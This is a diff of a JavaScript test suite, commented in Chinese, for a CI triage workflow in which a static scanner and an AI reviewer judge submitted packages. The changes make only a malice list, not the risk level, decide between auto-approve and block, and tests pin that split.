   // 2026-10-16 CI run 38890758068 实测到的假陈述：产物里 agree:false、5 条 findings 全 high，
   // 而静态本来就是 high ⇒ raiseLevel 抬不动 ⇒ changed=false ⇒ 落到「同意静态结论，等级未抬」那一句。
   // 「没抬」是效果，「同意」是立场，两件事不能共用一个分支。
+  // 这一发钉的是**文案**；处置那一格在新轴上是 auto-approve（静态 high 且名单外 ⇒ §2 第二轴只标注）。
   const { kv, err } = runTriage({ 'demo.zip': rep('high', 'first') }, {
     'demo.zip': { status: 'ok', ...aiArt('demo.zip', { agree: false, risk: 'high', findings: [aiHit('high', '下载后执行')] }) },
   });
   assert.equal(err, null, err && err.stderr);
   assert.equal(kv.risk, 'high');
-  assert.equal(kv.action, 'block');
+  assert.equal(kv.action, 'auto-approve', '这些 AI findings 不是名单成员：拦不住是设计，不是漏检（①+§3.2 ②）');
   assert.match(kv.ai_note, /^AI 安全员已复核（每条引用都逐字复验过送出去的那一份原文）：不同意静态结论/,
     'agree:false 就是不同意；抬不动不等于同意');
 });
@@ -731,6 +983,8 @@ test('矩阵·ok + agree:true 且未抬级：那一句仍然照旧写「同意�
 });
 
 test('矩阵：抬级是逐包算的，另一包的静态等级仍一起进「取最严」', () => {
+  // 这一格钉的是 risk 的**逐包聚合**口径（换轴不许改它）：a 被抬到 high、b 静态 medium
+  // ⇒ risk=high。处置那一格现在只由名单给，两包都在名单外 ⇒ auto-approve（①：其余一律上架）。
   const { kv } = runTriage({
     'a.zip': rep('low', 'first'),
     'b.zip': rep('medium', 'first'),
@@ -738,9 +992,18 @@ test('矩阵：抬级是逐包算的，另一包的静态等级仍一起进「�
     'a.zip': { status: 'ok', ...aiArt('a.zip', { agree: false, risk: 'high' }) },
     'b.zip': { status: 'ok', ...aiArt('b.zip', { agree: true }) },
   });
-  assert.equal(kv.risk, 'high');
+  assert.equal(kv.risk, 'high', '取最严的口径一个字没动：抬上来的那一级仍然要进 risk');
   assert.equal(kv.package_count, '2', '多包语义不许退回单包（变异哨兵会先红）');
-  assert.equal(kv.action, 'block');
+  assert.equal(kv.action, 'auto-approve', '等级不参与判决（§2）；b 包静态 medium 也不再拦整条 PR');
+  // 同一形状里把 b 换成命中名单 ⇒ 取严仍然 block（上面那两行不许被读成「多包变松了」）。
+  const hitOther = runTriage({
+    'a.zip': rep('low', 'first'),
+    'b.zip': repHit('medium', 'first'),
+  }, {
+    'a.zip': { status: 'ok', ...aiArt('a.zip', { agree: false, risk: 'high' }) },
+    'b.zip': { status: 'ok', ...aiArt('b.zip', { agree: true }) },
+  });
+  assert.equal(hitOther.kv.action, 'block', '任一命中就不上架（①）：另一包被抬到 high 这件事不许顶掉这一格');
 });
 
 test('矩阵·混合 disabled + ok：按「有 N 包没有 AI 意见」呈现，不许写成全都看过', () => {
@@ -869,16 +1132,31 @@ test('AI 的 findings 并进 reasons：带「AI 复核：」前缀，条数≤10
   for (const p of parts) assert.ok(p.length <= 'AI 复核：'.length + 200, `单条被截到 200 以内，实际 ${p.length}`);
 });
 
-test('判自动放行只许一处：TRIAGE_JS 里 "auto-approve" 与「low+first」判据各只出现一次', () => {
-  assert.equal((TRIAGE_JS.match(/"auto-approve"/g) || []).length, 1,
-    'action 一律由 decide(risk, changeType) 重算；多一处字面量就是有人另开了一扇门');
-  assert.equal((TRIAGE_JS.match(/===\s*"first"/g) || []).length, 1, '自动放行的判据只许在 decide 里算一次');
+test('判自动放行只许一份判据：TRIAGE_JS 里一个「放行」字面量都不写，decide()/classifyMalice() 各调一次', () => {
+  // 换轴后这一格钉的东西换了形态，但没有换方向（设计文档 §4 末行「改判据必须同轮换它」）：
+  // 旧写法是「auto-approve 与 low+first 判据各恰好一次」——那两句量的都是**这里那份手写矩阵**。
+  // 现在矩阵搬进了 audit/risk-rules.mjs，YAML 只是接线 ⇒ 这里出现任何一格判决的字面量，就是有人
+  // 抄了第二份判据。所以断言从「各一次」换成「零次 + 只 import 一份实现」，方向是更严不是更松。
+  for (const quote of ['"', "'"]) {
+    assert.equal((TRIAGE_JS.match(new RegExp(`${quote}auto-approve${quote}`, 'g')) || []).length, 0,
+      `放行那一格只由 import 进来的 decide() 给；YAML 里出现 ${quote}auto-approve${quote} 就是有人另开了一扇门`);
+  }
+  assert.equal((TRIAGE_JS.match(/===\s*"first"/g) || []).length, 0,
+    '那份手写的「low + first」矩阵必须已经删掉：它回来一次就等于在 YAML 里抄第二份判据（还是旧轴的）');
+  assert.equal((TRIAGE_JS.match(/===\s*"low"/g) || []).length, 0,
+    '等级不许再出现在判决里（§2：唯一决定上不上架的是名单）');
+  assert.doesNotMatch(TRIAGE_JS, /const decide\s*=/, 'decide 只许 import 一份实现：这一格是接线，不是判据');
+  assert.doesNotMatch(TRIAGE_JS, /const classifyMalice\s*=/, '名单同理：不在这里抄第二份命中判据');
+  assert.match(TRIAGE_JS, /risk-rules\.mjs/,
+    '名单与处置必须从 base 里那棵树 import（与上面 raiseLevel 同一条纪律：判据只许有一份）');
   assert.match(TRIAGE_JS, /=decide\(/);
   // 钉**调用点**（`=decide(`）而不是 `decide(`：writeFailClosed 上面那段注释里合法地写着
   // 「这三格永远不过 decide()」，扫关键字会把自己的说明当成第二个调用点打红 —— 与本文件那条
   // 「耦合钉子」被自己的注释打红是同一个坑，不踩第二次。
   assert.equal((TRIAGE_JS.match(/=decide\(/g) || []).length, 1,
     'decide() 只许被调用一次（绿那一发）：红那一发的处置是 writeFailClosed 里写死的三格，不过决策矩阵');
+  assert.equal((TRIAGE_JS.match(/=classifyMalice\(/g) || []).length, 1,
+    '名单判据也只许一个调用点：逐包各判一次由循环给，不许在别处再数一遍命中');
   assert.match(TRIAGE_JS, /w\("action","block"\); w\("label","needs-human-review"\); w\("needs_human_review","true"\);/,
     'fail-closed 那三格必须是写死的字面量 —— 让它由任何函数算出来，就等于给「算错方向」留了位置');
 });
@@ -891,6 +1169,11 @@ test('旧分支已死：workflow 全文不再有 llm.json / 已跳过 LLM 复核
     assert.ok(!wf.includes(s), `「${s}」还留在 workflow 里：那条分支是从旧写法抄来的，不是五态里的任何一个`);
   }
   assert.doesNotMatch(wf, /AI_API_KEY/, '默认后端是 QCA：这一步不再读那个 key，留着就是给运维指错仓库配置');
+  // 换轴之后这三句都是假话，它们必须死在 workflow 里（§4 那两行文案 + 分流那份手写矩阵）。
+  // 钉全文而不是只钉 TRIAGE_JS：标签 description 与头部注释也在对投稿人说话。
+  for (const s of ['静态扫描低风险且为首次收录', '唯一可自动放行的是「每一份都低风险 + 首次收录」', 'r==="low" && ct==="first"']) {
+    assert.ok(!wf.includes(s), `旧轴的文案/判据还留在 workflow 里：「${s}」在新模型下是一句假话（① 名单才决定上不上架）`);
+  }
 });
 
 test('旧两步已换成一步：id: mode 与 id: llm 都不存在，AI 步接管 found 条件', () => {
@@ -924,21 +1207,39 @@ test('端到端：AI 步写出的那批文件，分流按同一口径读得到�
   assert.equal(kv.package_count, '2');
 });
 
-test('端到端：ok+agree:false 经 AI 步落盘后，分流的 action 从 auto-approve 变成 block', () => {
+test('端到端：ok + AI 恶意结论经 AI 步落盘后，分流的 action 从 auto-approve 变成 block', () => {
+  // 这一发证明「名单 = 静态 ∪ AI 恶意结论」（①）不是测试里的夹具，而是 workflow 两步之间真的接上了：
+  // 产物由 AI 步（真 bash + 假脚本）写盘，分流从盘上读 maliceVerdict 再喂进那份 import 的 classifyMalice。
+  // 这半支接不上 ⇒ 线上跑的名单只剩静态那 11 条，比定案的窄 —— 正是本轮要修的那类「代码换了、接线没换」。
   const r = runAiStep({
     zips: ['demo.zip'],
     plan: {
-      'demo.zip': { status: 'ok', artifact: { agree: false, risk: 'high', findings: [aiHit('high', '端到端抬一级')] },
-      },
+      'demo.zip': { status: 'ok', artifact: { agree: true, maliceVerdict: aiMaliceHit() } },
     },
   });
   assert.equal(r.code, 0, r.stderr);
   installModule(r.dir);
   const { kv, err } = runTriage({}, undefined, { dir: r.dir, module: false });
   assert.equal(err, null, err && err.stderr);
-  assert.equal(kv.risk, 'high');
-  assert.equal(kv.action, 'block', '这一发证明「AI 参与定级」不是测试里的夹具，而是 workflow 两步之间真的接上了');
-  assert.match(kv.reasons, /AI 复核：端到端抬一级/);
+  assert.equal(kv.risk, 'low', 'AI 的恶意结论不改等级：等级那一根轴只由 raiseLevel 走（§2 两轴分开写）');
+  assert.equal(kv.action, 'block', '静态干净 + AI 恶意且引用复验过 ⇒ 拦：这一发就是 ∪ 接上了的证据');
+  assert.equal(kv.needs_human_review, 'true');
+
+  // 同一条路上的对照：AI 只抬级（agree:false + 一条 high findings）、没有恶意结论 ⇒ 抬上去的是标注，
+  // 判决仍然是放行。这一发留着，因为它是「换轴不许把等级重新变成判决」的端到端证人。
+  const raised = runAiStep({
+    zips: ['demo.zip'],
+    plan: {
+      'demo.zip': { status: 'ok', artifact: { agree: false, risk: 'high', findings: [aiHit('high', '端到端抬一级')] } },
+    },
+  });
+  assert.equal(raised.code, 0, raised.stderr);
+  installModule(raised.dir);
+  const again = runTriage({}, undefined, { dir: raised.dir, module: false });
+  assert.equal(again.err, null, again.err && again.err.stderr);
+  assert.equal(again.kv.risk, 'high', '抬级仍然要进 risk —— 标注轴那半支一个字没撤');
+  assert.equal(again.kv.action, 'auto-approve', '名单外 ⇒ 等级不再当判决（① / §2）');
+  assert.match(again.kv.reasons, /AI 复核：端到端抬一级/);
 });
 
 /* ===========================================================================
@@ -1085,6 +1386,8 @@ const fullArt = (pkg, over = {}) => ({
   agree: false,
   risk: 'high',
   levelAfterAi: 'high',
+  // ai-review.mjs 对 status=ok 恒写这一格（名单上 AI 那一支的输入）；漏了它，分流按 fail-closed 红。
+  maliceVerdict: { malicious: false, verified: [], basis: 'no-verdict' },
   findings: [aiHit('high', '模型原话：install.sh 第 2 行')],
   brief: {
     byteSize: 4321, neededBytes: 54321, corpusFiles: 7, fileCount: 9, overBudget: false, emptyInput: false,
